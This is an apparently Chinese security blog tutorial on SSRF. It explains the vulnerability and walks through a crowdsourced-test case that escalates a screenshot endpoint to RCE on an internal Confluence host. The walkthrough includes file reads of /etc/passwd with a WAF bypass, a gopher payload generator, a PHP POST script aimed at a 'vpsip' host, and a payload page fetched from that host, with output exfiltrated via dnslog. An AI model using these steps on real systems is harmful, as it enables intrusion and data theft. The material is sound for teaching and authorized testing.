#  Web漏洞挖掘指南 -SSRF服务器端请求伪造   
 迪哥讲事   2025-04-22 09:30  
  
一、漏洞原理及触发场景  
  
  
**0x1**  
  
  
web服务器经常需要从别的服务器获取数据，比如文件载入、图片拉取、图片识别等功能，如果获取数据的服务器地址可控，攻击者就可以通过web服务器自定义向别的服务器发出请求。因为web服务器常搭建在DMZ区域，因此常被攻击者当作跳板，向内网服务器发出请求。  
  
  
**0x2**  
  
  
常见的ssrf漏洞场景（所有需要输入url的地方都可以尝试ssrf，将url改成dnslog地址，验证请求IP是否来自web服务器）：  
  
- 远程图片拉取  
  
- xls，doc等文件预览  
  
- 头像加载  
  
- 其他网站的访问截图  
  
  
  
  
**0x3**  
  
  
ssrf常用的协议：http/https、dict、file、gopher、sftp、ldap、tftp  
  
  
二、漏洞检测及利用  
  
  
**0x1**  
  
  
任何需要传入URL的接口都有可能出现ssrf漏洞，可根据实际业务场景对功能接口进行漏洞验证。ssrf漏洞可分为有回显型和无回显型，有回显型ssrf可以直接通过页面加载出目标资产，可先尝试加载http://www.baidu.com 页面确认有ssrf，如果成功的话，可进一步将百度换成内网IP，通过fuzz扫描内网资产。  
  
  
**0x2**  
  
  
无回显型ssrf的检测需要先配合dnslog平台，测试dnslog平台能否获取到服务器的访问记录，如果没有对应记录，也可能是服务器不出网造成的，利用时可以通过请求响应时间判断内网资产是否存在，然后再利用内网资产漏洞（比如redis以及常见可RCE的web框架）证明漏洞的有效性。  
  
  
**0x3**  
  
  
有回显型ssrf往往可以直接操作内网web资产，不做多赘述。下面由某次众测SSRF案例总结无回显型或半回显型ssrf的利用过程。  
  
  
三、某次众测SSRF案例  
  
  
（禁用gopher协议时发POST包getshell）  
  
  
**0x1**  
  
  
感谢 @Rus 师傅提供的漏洞，这个ssrf虽然能看到访问截图，但是无法直接操作内网web资产，因此和无回显型ssrf的利用合并总结了。首先在js中发现接口：  
  
```
https://xxx.com/mall-tools/v1-0/tools/screenshot?url=url/&width=3272&height=1840&sleepMillis=10000
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGiaiaHbm96tiaVngqzicHStWOlZQoHOjDr2CEL2MeomprpBIrPInibibWOeIg/640?wx_fmt=png "")  
  
  
**0x2**  
  
  
通过接口名称大概知道是截图功能的接口，后接的url参数是可控的，将url地址改为www.baidu.com,响应包返回的数据中给出了截图地址:  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGR3ZwytoNq8U8SLa2ITGV2K7LMuAiajg5CvdcSEjumQTmST5wI0gHMYg/640?wx_fmt=png "")  
  
  
**0x3**  
  
  
访问该图片地址直接下载值本地，发现正是百度的首页，url改为ceye地址，通过http记录发现UA是基于Linux上chrome内核的浏览器：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGetNZJJTkXicaNmeY3BibNIicHIY3jbEW0qibz4Pubh6ic2VnvhwQjX0jWsw/640?wx_fmt=png "")  
  
  
**0x4**  
  
  
猜测请求过程：客户端通过接口传入url→web服务器接收到地址后用浏览器访问该url→访问后将网页详情截图并上传cdn→接口请求成功响应并返回截图保存地址  
  
  
chrome浏览器默认支持：Http，Https，File，Ftp，Linux环境下先尝试读取/etc/passwd,  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowG7xZV7hl5Gewe0rZQGOiaAjz2xOQTwCcKEk6Yt6A6u4jZKhRWrjHicoRQ/640?wx_fmt=png "")  
  
  
**0x5**  
  
  
将url改成/etc/./././././././passwd可绕过该waf，发现部分用户的hash：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowG4ATpxhh9bqr9KG6qCcDNdTGpbhlZdvUCrib3kSRWuicBicX0XOuCxx8SQ/640?wx_fmt=png "")  
  
  
**0x6**  
  
  
因为当前用户权限不够，无法读/root/.bash_history和shadow文件，也不知道web源码的绝对路径无法读配置文件，此时还可以读取/etc/hosts文件获取部分内网web资产：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGtZWQcxVaFcp4B2gKvrOhaswyf9uK1131iaQxFYibLnCgBqDtYu2OBd3w/640?wx_fmt=png "")  
  
  
**0x7**  
  
  
除了以上收集到的资产，平时遇到无回显SSRF，还可以尝试寻找内网的Confluence, Artifactory, Jenkins, 和JAMF等资产，这篇文章是专门介绍bind ssrf利用技巧的，可以作为参考：  
  
```
https://github.com/assetnote/blind-ssrf-chains
```  
  
  
在GitHub搜索厂商域名关键字+jenkins、wiki、oa、git、svn等有可能出现在域名中的词，发现jenkins和confluence内网资产：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGTSokSwyx42qfXqMnMKiaEayxIcvHksG9bwibmankJgvY1z14KicqKtS4g/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGFXrKWp1d1mjoFhFfPb0TQbQOOzEukl6DBHxAmrgWn93lJqiarkBzZHQ/640?wx_fmt=png "")  
  
  
**0x8**  
  
  
以上域名公网无法访问，通过ssrf接口带入  
```
https://xxx.com/mall-tools/v1-0/tools/screenshot?url=url/&width=3272&height=1840&sleepMillis=10000
```  
  
  
查看截图后发现jenkins有登录口，无法直接未授权RCE，需要尝试其他历史漏洞，这时可以先试试近期公开的CVE-2021-26084，confluence未授权RCE，详情以及payload参考：  
```
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
```  
  
  
**0x9**  
  
  
该漏洞的触发需要发送POST请求，以下列举ssrf漏洞发送POST请求的几种思路：  
  
  
- 符号列表利用gopher协议直接发送POST请求。用python脚本生成gopher数据流，参考：  
  
  
```
https://blog.csdn.net/weixin_45887311/article/details/107327706
```  
  
```
        import urllib.parse
        test =\
        """POST / HTTP/1.1
        Host: 127.0.0.1:8000
        """  
        #以上内容放置请求包内容，注意后面一定要有回车，回车结尾表示http请求结束
        tmp = urllib.parse.quote(test)
        new = tmp.replace('%0A','%0D%0A')
        result = '_'+new
        print(result)
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGa13lNSUOtbe7xhnFOArvpzkghWVzib1AvN78OCCoeb37WoSLxWuJL3Q/640?wx_fmt=png "")  
  
  
除了发出HTTP请求外，gopher协议还常被用来攻击内网redis、Zabbix、FastCGI、mysql等服务，利用工具：  
```
https://github.com/tarunkant/Gopherus
```  
  
  
- ssrf不支持gopher协议时可考虑利用302跳转。条件：ssrf支持302跳转。参考：  
  
  
```
https://zone.huoxian.cn/d/392
```  
  
  
土司上也有师傅写过用302跳转对discuz的ssrf进行利用的案例：  
```
https://www.t00ls.cc/articles-62210.html
```  
  
  
302.php发出POST请求：  
  
```
        <?php
        /**
         * 发送post请求
         * @param string $url 请求地址
         * @param array $post_data post键值对数据
         * @return string
         */
        function send_post($url, $post_data){
            $postData = http_build_query($post_data);
            $options = array(
                'http' => array(
                    'method' => 'POST',
                    'header' => 'Content-type:application/x-www-form-urlencoded',
                    'content' => $postData,
                    'timeout' => 15 * 60// 超时时间（单位:s）
                )
            );
            $context = stream_context_create($options);
            $result = file_get_contents($url, false, $context);
        
            return $result;
        }
        
        //使用方法
        $post_data = array(
            'username' => 'stclair2201',
            'password' => 'handan'
        );
        send_post('http://vpsip:8000', $post_data);
        ?>
```  
  
- 结合csrf自动提交POST表单。条件：支持跳转，无refer限制。前文提到，目标服务器可能是通过浏览器访问后再截图，因此重定向是可以实现的，这里提供一种比302跳转更方便的解决方案，直接用burp生成csrf poc，然后加入一段js来自动提交表单，这样也类似于302重定向的利用方式了。  
  
  
  
  
**0x10**  
  
  
当前场景，结合csrf自动提交POST表单的方法是最方便的，因为是半回显ssrf，命令执行结果在截图中无法提现，可通过dnslog将命令执行结果外带，漏洞请求包：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGF1dYqyZnqLqe9xgxjCH4icy1tZLmicxvtlbkMWC3uo4icDRMXN76ANYibA/640?wx_fmt=png "")  
  
  
**0x11**  
  
  
用burp生成csrf poc后，加入自动提交表单的js，然后将其保存在vps上的exp.html中：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGfkaibvUGmhqIzcjMSGegWaErHicCGlrVavJMJXYpqxZCpMqc6RU81jkw/640?wx_fmt=png "")  
  
  
**0x12**  
  
  
最后访问  
```
https://xxx.com/mall-tools/v1-0/tools/screenshot?url=http://vpsip/exp.html
```  
  
实现RCE，用dnslog将命令执行结果外带：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTia3MfOWYXa4Ae0kSHLVowGfynB2OMWJ626Osks6iacd7FVicEvfR1k6mZIVOAVl0ZAh18hgyf3ZBHw/640?wx_fmt=png "")  
  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg "")  
  
往期回顾  
  
[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)  
  
  
[挖掘有回显ssrf的隐藏payload](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496898&idx=1&sn=b6088e20a8b4fc9fbd887b900d8c5247&scene=21#wechat_redirect)  
  
  
[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)  
  
  
[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
[‍](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
